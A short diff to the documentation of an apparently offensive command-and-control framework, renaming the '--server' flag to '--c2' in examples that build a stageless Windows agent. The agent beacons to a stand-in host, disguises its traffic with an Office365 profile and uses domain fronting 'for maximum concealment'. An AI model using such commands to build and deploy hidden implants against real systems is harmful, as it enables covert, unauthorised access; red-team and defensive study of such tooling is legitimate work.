@@ -41,10 +41,9 @@ The server registers URI routes for the selected profile. Agents built with the 
 
 ```bash
 ./bin/taburtuai-generate stageless \
-  --server https://c2.example.com \
+  --c2 https://c2.example.com \
   --key changeme \
   --c2-profile office365 \
-  --os windows \
   --arch amd64 \
   --output ./output/agent.exe
 ```
@@ -185,7 +184,7 @@ When `kill_date` is set (e.g., `"2026-05-31"`), the agent compares it against th
 # Example: build agent that self-destructs after engagement
 ./bin/taburtuai-generate stageless \
   --kill-date 2026-05-31 \
-  --server https://c2.example.com \
+  --c2 https://c2.example.com \
   --key changeme \
   --output ./output/agent.exe
 ```
@@ -204,7 +203,7 @@ Combine a malleable profile with domain fronting for maximum concealment:
 1. **Build the agent** with domain fronting and Office365 profile:
 ```bash
 ./bin/taburtuai-generate stageless \
-  --server https://real-c2.example.com \
+  --c2 https://real-c2.example.com \
   --c2-profile office365 \
   --front-domain *.azurefd.net \
   --key changeme \
